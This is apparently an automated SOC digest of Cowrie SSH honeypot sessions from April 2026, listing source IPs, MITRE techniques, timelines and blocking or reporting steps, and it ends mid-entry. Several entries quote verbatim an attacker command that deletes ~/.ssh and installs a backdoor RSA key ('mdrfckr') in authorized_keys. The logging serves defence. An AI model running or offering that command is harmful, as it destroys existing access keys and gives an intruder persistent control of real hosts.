| Field | Detail |
|---|---|
| **Source IP** | `183.150.183[.]20` |
| **First Seen** | 2026-04-14 02:21 |
| **Last Seen** | 2026-04-14 02:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:21:44` | `cowrie.session.connect` |
| `2026-04-14 02:21:44` | `cowrie.client.version` |
| `2026-04-14 02:21:44` | `cowrie.client.kex` |
| `2026-04-14 02:21:45` | `cowrie.login.success` |
| `2026-04-14 02:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.150.183[.]20` to AbuseIPDB if not already reported
- [ ] Block `183.150.183[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07df37427f20

| Field | Detail |
|---|---|
| **Source IP** | `83.219.249[.]173` |
| **First Seen** | 2026-04-14 02:21 |
| **Last Seen** | 2026-04-14 02:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:21:45` | `cowrie.session.connect` |
| `2026-04-14 02:21:45` | `cowrie.client.version` |
| `2026-04-14 02:21:45` | `cowrie.client.kex` |
| `2026-04-14 02:21:45` | `cowrie.login.success` |
| `2026-04-14 02:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.219.249[.]173` to AbuseIPDB if not already reported
- [ ] Block `83.219.249[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fba4c87f6af5

| Field | Detail |
|---|---|
| **Source IP** | `183.150.183[.]20` |
| **First Seen** | 2026-04-14 02:21 |
| **Last Seen** | 2026-04-14 02:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:21:49` | `cowrie.session.connect` |
| `2026-04-14 02:21:49` | `cowrie.client.version` |
| `2026-04-14 02:21:49` | `cowrie.client.kex` |
| `2026-04-14 02:21:50` | `cowrie.login.success` |
| `2026-04-14 02:21:50` | `cowrie.session.params` |
| `2026-04-14 02:21:50` | `cowrie.command.input` |
| `2026-04-14 02:21:50` | `cowrie.command.failed` |
| `2026-04-14 02:21:50` | `cowrie.log.closed` |
| `2026-04-14 02:21:51` | `cowrie.session.params` |
| `2026-04-14 02:21:51` | `cowrie.command.input` |
| `2026-04-14 02:21:51` | `cowrie.session.file_download` |
| `2026-04-14 02:21:51` | `cowrie.log.closed` |
| `2026-04-14 02:21:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.150.183[.]20` to AbuseIPDB if not already reported
- [ ] Block `183.150.183[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fb61bd9bb3a

| Field | Detail |
|---|---|
| **Source IP** | `183.150.183[.]20` |
| **First Seen** | 2026-04-14 02:21 |
| **Last Seen** | 2026-04-14 02:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:21:53` | `cowrie.session.connect` |
| `2026-04-14 02:21:53` | `cowrie.client.version` |
| `2026-04-14 02:21:53` | `cowrie.client.kex` |
| `2026-04-14 02:21:53` | `cowrie.login.success` |
| `2026-04-14 02:21:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.150.183[.]20` to AbuseIPDB if not already reported
- [ ] Block `183.150.183[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02b994affe6d

| Field | Detail |
|---|---|
| **Source IP** | `183.150.183[.]20` |
| **First Seen** | 2026-04-14 02:21 |
| **Last Seen** | 2026-04-14 02:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:21:58` | `cowrie.session.connect` |
| `2026-04-14 02:21:58` | `cowrie.client.version` |
| `2026-04-14 02:21:58` | `cowrie.client.kex` |
| `2026-04-14 02:21:58` | `cowrie.login.success` |
| `2026-04-14 02:21:59` | `cowrie.session.params` |
| `2026-04-14 02:21:59` | `cowrie.command.input` |
| `2026-04-14 02:21:59` | `cowrie.command.failed` |
| `2026-04-14 02:21:59` | `cowrie.log.closed` |
| `2026-04-14 02:21:59` | `cowrie.session.params` |
| `2026-04-14 02:21:59` | `cowrie.command.input` |
| `2026-04-14 02:21:59` | `cowrie.session.file_download` |
| `2026-04-14 02:21:59` | `cowrie.log.closed` |
| `2026-04-14 02:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.150.183[.]20` to AbuseIPDB if not already reported
- [ ] Block `183.150.183[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc777fd7eef9

| Field | Detail |
|---|---|
| **Source IP** | `183.150.183[.]20` |
| **First Seen** | 2026-04-14 02:22 |
| **Last Seen** | 2026-04-14 02:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:22:01` | `cowrie.session.connect` |
| `2026-04-14 02:22:01` | `cowrie.client.version` |
| `2026-04-14 02:22:01` | `cowrie.client.kex` |
| `2026-04-14 02:22:02` | `cowrie.login.success` |
| `2026-04-14 02:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.150.183[.]20` to AbuseIPDB if not already reported
- [ ] Block `183.150.183[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ca321d1b881

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-04-14 02:23 |
| **Last Seen** | 2026-04-14 02:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:23:13` | `cowrie.session.connect` |
| `2026-04-14 02:23:13` | `cowrie.client.version` |
| `2026-04-14 02:23:13` | `cowrie.client.kex` |
| `2026-04-14 02:23:14` | `cowrie.login.success` |
| `2026-04-14 02:23:15` | `cowrie.session.params` |
| `2026-04-14 02:23:15` | `cowrie.command.input` |
| `2026-04-14 02:23:15` | `cowrie.command.failed` |
| `2026-04-14 02:23:15` | `cowrie.log.closed` |
| `2026-04-14 02:23:16` | `cowrie.session.params` |
| `2026-04-14 02:23:16` | `cowrie.command.input` |
| `2026-04-14 02:23:16` | `cowrie.session.file_download` |
| `2026-04-14 02:23:16` | `cowrie.log.closed` |
| `2026-04-14 02:23:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e834130f93c3

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-04-14 02:23 |
| **Last Seen** | 2026-04-14 02:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:23:20` | `cowrie.session.connect` |
| `2026-04-14 02:23:20` | `cowrie.client.version` |
| `2026-04-14 02:23:20` | `cowrie.client.kex` |
| `2026-04-14 02:23:21` | `cowrie.login.success` |
| `2026-04-14 02:23:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d3aaae1ece2

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:24 |
| **Last Seen** | 2026-04-14 02:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:24:26` | `cowrie.session.connect` |
| `2026-04-14 02:24:26` | `cowrie.client.version` |
| `2026-04-14 02:24:26` | `cowrie.client.kex` |
| `2026-04-14 02:24:26` | `cowrie.login.success` |
| `2026-04-14 02:24:27` | `cowrie.session.params` |
| `2026-04-14 02:24:27` | `cowrie.command.input` |
| `2026-04-14 02:24:27` | `cowrie.command.failed` |
| `2026-04-14 02:24:27` | `cowrie.log.closed` |
| `2026-04-14 02:24:27` | `cowrie.session.params` |
| `2026-04-14 02:24:27` | `cowrie.command.input` |
| `2026-04-14 02:24:27` | `cowrie.session.file_download` |
| `2026-04-14 02:24:27` | `cowrie.log.closed` |
| `2026-04-14 02:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25cb65ad0768

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:24 |
| **Last Seen** | 2026-04-14 02:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:24:29` | `cowrie.session.connect` |
| `2026-04-14 02:24:29` | `cowrie.client.version` |
| `2026-04-14 02:24:29` | `cowrie.client.kex` |
| `2026-04-14 02:24:30` | `cowrie.login.success` |
| `2026-04-14 02:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53c72ea7094d

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-04-14 02:25 |
| **Last Seen** | 2026-04-14 02:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:25:13` | `cowrie.session.connect` |
| `2026-04-14 02:25:13` | `cowrie.client.version` |
| `2026-04-14 02:25:14` | `cowrie.client.kex` |
| `2026-04-14 02:25:15` | `cowrie.login.success` |
| `2026-04-14 02:25:15` | `cowrie.session.params` |
| `2026-04-14 02:25:15` | `cowrie.command.input` |
| `2026-04-14 02:25:15` | `cowrie.command.failed` |
| `2026-04-14 02:25:16` | `cowrie.log.closed` |
| `2026-04-14 02:25:16` | `cowrie.session.params` |
| `2026-04-14 02:25:16` | `cowrie.command.input` |
| `2026-04-14 02:25:17` | `cowrie.session.file_download` |
| `2026-04-14 02:25:17` | `cowrie.log.closed` |
| `2026-04-14 02:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad3ba215f0f3

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:25 |
| **Last Seen** | 2026-04-14 02:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:25:16` | `cowrie.session.connect` |
| `2026-04-14 02:25:16` | `cowrie.client.version` |
| `2026-04-14 02:25:16` | `cowrie.client.kex` |
| `2026-04-14 02:25:17` | `cowrie.login.success` |
| `2026-04-14 02:25:17` | `cowrie.session.params` |
| `2026-04-14 02:25:17` | `cowrie.command.input` |
| `2026-04-14 02:25:17` | `cowrie.command.failed` |
| `2026-04-14 02:25:17` | `cowrie.log.closed` |
| `2026-04-14 02:25:17` | `cowrie.session.params` |
| `2026-04-14 02:25:17` | `cowrie.command.input` |
| `2026-04-14 02:25:17` | `cowrie.session.file_download` |
| `2026-04-14 02:25:17` | `cowrie.log.closed` |
| `2026-04-14 02:25:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-793d7ab521d7

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:25 |
| **Last Seen** | 2026-04-14 02:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:25:19` | `cowrie.session.connect` |
| `2026-04-14 02:25:19` | `cowrie.client.version` |
| `2026-04-14 02:25:19` | `cowrie.client.kex` |
| `2026-04-14 02:25:20` | `cowrie.login.success` |
| `2026-04-14 02:25:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b1cc691e8a2

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-04-14 02:25 |
| **Last Seen** | 2026-04-14 02:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:25:20` | `cowrie.session.connect` |
| `2026-04-14 02:25:20` | `cowrie.client.version` |
| `2026-04-14 02:25:20` | `cowrie.client.kex` |
| `2026-04-14 02:25:22` | `cowrie.login.success` |
| `2026-04-14 02:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e80c2391de4

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:25 |
| **Last Seen** | 2026-04-14 02:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:25:37` | `cowrie.session.connect` |
| `2026-04-14 02:25:37` | `cowrie.client.version` |
| `2026-04-14 02:25:37` | `cowrie.client.kex` |
| `2026-04-14 02:25:38` | `cowrie.login.success` |
| `2026-04-14 02:25:38` | `cowrie.session.params` |
| `2026-04-14 02:25:38` | `cowrie.command.input` |
| `2026-04-14 02:25:38` | `cowrie.command.failed` |
| `2026-04-14 02:25:38` | `cowrie.log.closed` |
| `2026-04-14 02:25:39` | `cowrie.session.params` |
| `2026-04-14 02:25:39` | `cowrie.command.input` |
| `2026-04-14 02:25:39` | `cowrie.session.file_download` |
| `2026-04-14 02:25:39` | `cowrie.log.closed` |
| `2026-04-14 02:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7df2540a560

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:25 |
| **Last Seen** | 2026-04-14 02:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:25:41` | `cowrie.session.connect` |
| `2026-04-14 02:25:41` | `cowrie.client.version` |
| `2026-04-14 02:25:41` | `cowrie.client.kex` |
| `2026-04-14 02:25:41` | `cowrie.login.success` |
| `2026-04-14 02:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1e6b6de8619

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:27 |
| **Last Seen** | 2026-04-14 02:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:27:03` | `cowrie.session.connect` |
| `2026-04-14 02:27:03` | `cowrie.client.version` |
| `2026-04-14 02:27:03` | `cowrie.client.kex` |
| `2026-04-14 02:27:03` | `cowrie.login.success` |
| `2026-04-14 02:27:04` | `cowrie.session.params` |
| `2026-04-14 02:27:04` | `cowrie.command.input` |
| `2026-04-14 02:27:04` | `cowrie.command.failed` |
| `2026-04-14 02:27:04` | `cowrie.log.closed` |
| `2026-04-14 02:27:04` | `cowrie.session.params` |
| `2026-04-14 02:27:04` | `cowrie.command.input` |
| `2026-04-14 02:27:04` | `cowrie.session.file_download` |
| `2026-04-14 02:27:04` | `cowrie.log.closed` |
| `2026-04-14 02:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed2c19054c36

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:27 |
| **Last Seen** | 2026-04-14 02:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:27:06` | `cowrie.session.connect` |
| `2026-04-14 02:27:06` | `cowrie.client.version` |
| `2026-04-14 02:27:07` | `cowrie.client.kex` |
| `2026-04-14 02:27:07` | `cowrie.login.success` |
| `2026-04-14 02:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
